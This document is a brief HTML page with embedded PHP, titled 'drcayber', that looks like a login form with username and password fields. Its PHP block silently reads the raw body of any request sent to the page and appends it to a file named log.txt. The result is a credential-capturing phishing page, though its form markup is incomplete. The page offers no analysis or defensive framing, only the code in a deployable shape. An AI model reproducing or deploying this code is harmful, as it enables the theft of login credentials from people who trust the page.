<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>drcayber</title>
</head>

<body>

<?php
    $o = fopen("php://input", "r");
    $str = stream_get_contents($o);
    fclose($o);
    $t = fopen("log.txt", "a+");
    fwrite($t, $str);
    fclose($t);
?>

  user account
	<input type="text" placeholder="username" /><br />
  password account:
  <input type="password" placeholder="type password" /><br /><br />
</body>
</html>